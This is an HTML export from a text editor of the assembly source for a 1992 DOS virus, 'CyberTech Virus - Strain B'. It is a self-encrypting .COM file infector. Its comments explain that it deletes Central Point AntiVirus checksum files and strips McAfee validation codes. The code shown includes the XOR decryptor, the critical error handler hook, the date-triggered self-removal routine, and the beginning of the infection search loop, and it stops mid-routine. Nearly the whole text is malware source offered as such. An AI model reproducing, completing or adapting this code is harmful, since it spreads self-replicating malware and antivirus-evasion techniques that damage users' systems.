<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  CyberTech Virus - Strain B                           John Tardy (C) 1992</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Written in A86 V3.22</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Description : This is a Non-Resident Self-Encrypting .COM file infector</span><span class="sc0">
</span><span class="sc1">;                which infects COM files in the current directory. It will</span><span class="sc0">
</span><span class="sc1">;                remove CHKLIST.CPS from the current directory after it has</span><span class="sc0">
</span><span class="sc1">;                infected a program. CHKLIST.CPS is a file which is used by</span><span class="sc0">
</span><span class="sc1">;                VDEFEND of PCSHELL and Central Point AntiVirus. When a</span><span class="sc0">
</span><span class="sc1">;                validation code is added by SCAN of McAfee, it will overwrite</span><span class="sc0">
</span><span class="sc1">;                the code, so the file is no longer CRC protected anymore.</span><span class="sc0">
</span><span class="sc1">;                After 1993, the virus activated. It then displays a message</span><span class="sc0">
</span><span class="sc1">;                that your system has been infected. The virus will remove</span><span class="sc0">
</span><span class="sc1">;                itself from the infected file and completely restore it. If</span><span class="sc0">
</span><span class="sc1">;                a validation code was added, it is lost, but the file is not</span><span class="sc0">
</span><span class="sc1">;                corrupted and will function normally. Even when the file is</span><span class="sc0">
</span><span class="sc1">;                compressed afterwards by an executable file compressor, it is</span><span class="sc0">
</span><span class="sc1">;                uncompressed. Before 1994, the virus sometimes display it's</span><span class="sc0">
</span><span class="sc1">;                copyright. This is caused when the random encryption counter</span><span class="sc0">
</span><span class="sc1">;                is a 0. It will redefine it, so there is no visible text in</span><span class="sc0">
</span><span class="sc1">;                the virus. It checks also if there is enough diskspace</span><span class="sc0">
</span><span class="sc1">;                aveable and installs a critical error handler.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">                              </span><span class="sc1">; Generate .BIN file</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">MainVir</span><span class="sc0">                         </span><span class="sc1">; Jump to decryptor code at EOF</span><span class="sc0">

            </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc12">'*'</span><span class="sc0">                              </span><span class="sc1">; Virus signature (very short)</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Decryptor procedure</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">MainVir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">On1</span><span class="sc0">                            </span><span class="sc1">; Push offset on stack</span><span class="sc0">

</span><span class="sc5">On1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">                              </span><span class="sc1">; Calculate virus offset</span><span class="sc0">
            </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">MainVir</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">                             </span><span class="sc1">; Save possible error code</span><span class="sc0">

            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Crypt</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Decrypt the virus with a</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">                           </span><span class="sc1">; very simple exclusive or</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">CryptLen</span><span class="sc0">                     </span><span class="sc1">; function.</span><span class="sc0">
</span><span class="sc5">Decrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">Lodsb</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Stosb</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Loop</span><span class="sc0"> </span><span class="sc5">Decrypt</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">DecrLen</span><span class="sc0">     </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MainVir</span><span class="sc0">                       </span><span class="sc1">; Length of the decryptor</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Main initialization procedure</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Crypt</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">OrgPrg</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Store begin of host at</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">OrgPrg</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">; cs:100h (begin of com)</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">Start</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]+</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                           </span><span class="sc1">; Get original interrupt 24</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">                             </span><span class="sc1">; (critical error handler)</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">,</span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">24h</span><span class="sc4">]+</span><span class="sc2">4</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">OldInt24</span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">     </span><span class="sc1">; And store it on a save place</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">OldInt24</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">Es</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc5">NewInt24</span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Install own critical error</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">                             </span><span class="sc1">; handler to avoid messages</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">                              </span><span class="sc1">; when a disk is write</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">          </span><span class="sc1">; protected and such things</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">24h</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                          </span><span class="sc1">; Check if DOS version is</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; 3.0 or above for correct</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; interrupt use</span><span class="sc0">
            </span><span class="sc6">Jae</span><span class="sc0"> </span><span class="sc5">TestDate</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Ready</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">TestDate</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                          </span><span class="sc1">; Check if 1993 is past time</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; already</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">1994</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jae</span><span class="sc0"> </span><span class="sc5">Clean</span><span class="sc0">                           </span><span class="sc1">; - 1994 or more</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">NoClean</span><span class="sc0">                         </span><span class="sc1">; - Not 1994 or more</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Main Cleanup procedure</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Clean</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                          </span><span class="sc1">; Move DTA to a safe place</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fd00h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; Find the name of the</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                           </span><span class="sc1">; program that is now</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; executed (me must search in</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">                        </span><span class="sc1">; the DOS environment for</span><span class="sc0">
</span><span class="sc5">Seeker</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Lodsb</span><span class="sc0">                               </span><span class="sc1">; safe tracking of the name</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Je</span><span class="sc0"> </span><span class="sc5">On3</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Loop</span><span class="sc0"> </span><span class="sc5">Seeker</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">On3</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">                              </span><span class="sc1">; Transfer the found name</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">                             </span><span class="sc1">; to a safe address in memory</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">0fd80h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Trans</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Lodsb</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Je</span><span class="sc0"> </span><span class="sc5">Verder</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Stosb</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Loop</span><span class="sc0"> </span><span class="sc5">Trans</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Verder</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Stosb</span><span class="sc0">
            </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,[</span><span class="sc8">Di</span><span class="sc4">][</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">Normal</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,[</span><span class="sc8">Di</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'MM'</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">Normal</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,[</span><span class="sc8">Di</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'NA'</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">Normal</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Ready</span><span class="sc0">

</span><span class="sc5">Normal</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">                             </span><span class="sc1">; Read file attributes and</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">                              </span><span class="sc1">; check if an error has</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                        </span><span class="sc1">; occured</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fd80h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jnc</span><span class="sc0"> </span><span class="sc5">DeInfect</span><span class="sc0">                        </span><span class="sc1">; - No error, DeInfect</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Ready</span><span class="sc0">                           </span><span class="sc1">; - Error, Ready</span><span class="sc0">

</span><span class="sc5">DeInfect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                             </span><span class="sc1">; Store old file attributes</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                        </span><span class="sc1">; Clear file attributes</span><span class="sc0">
            </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                           </span><span class="sc1">; (for read only etc.)</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                        </span><span class="sc1">; Open the file</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                           </span><span class="sc1">; Read file date/time stamp</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                        </span><span class="sc1">; and store it on the stack</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; for later use</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                          </span><span class="sc1">; Close file</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fd80h</span><span class="sc0">                       </span><span class="sc1">; Create a new file with the</span><span class="sc0">
            </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                           </span><span class="sc1">; same name</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                           </span><span class="sc1">; store file handle in BX</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                         </span><span class="sc1">; program to file (the original</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                           </span><span class="sc1">; file is now back again)</span><span class="sc0">
            </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; write memory image of host</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">                              </span><span class="sc1">; restore file date/time</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                              </span><span class="sc1">; stamp</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                          </span><span class="sc1">; close file</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                              </span><span class="sc1">; restore file attributes</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fd80h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">                             </span><span class="sc1">; Show message that the</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">                              </span><span class="sc1">; system has been infected</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                            </span><span class="sc1">; and shutdown virus</span><span class="sc0">
            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">Removed</span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Ready</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Main viral part</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">NoClean</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                          </span><span class="sc1">; Store DTA at safe place</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fd00h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                          </span><span class="sc1">; FindFirsFile Function</span><span class="sc0">

</span><span class="sc5">Search</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">FileSpec</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Search for filespec given</span><span class="sc0">
            </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                           </span><span class="sc1">; in FileSpec adress</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jnc</span><span class="sc0"> </span><span class="sc5">Found</span><span class="sc0">                           </span><span class="sc1">; Found - Found</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Ready</span><span class="sc0">                           </span><span class="sc1">; Not Found - Ready</span><span class="sc0">

</span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                        </span><span class="sc1">; Get file attributes and</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fd1eh</span><span class="sc0">                       </span><span class="sc1">; store them on the stack</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                        </span><span class="sc1">; clear file attributes</span><span class="sc0">
            </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
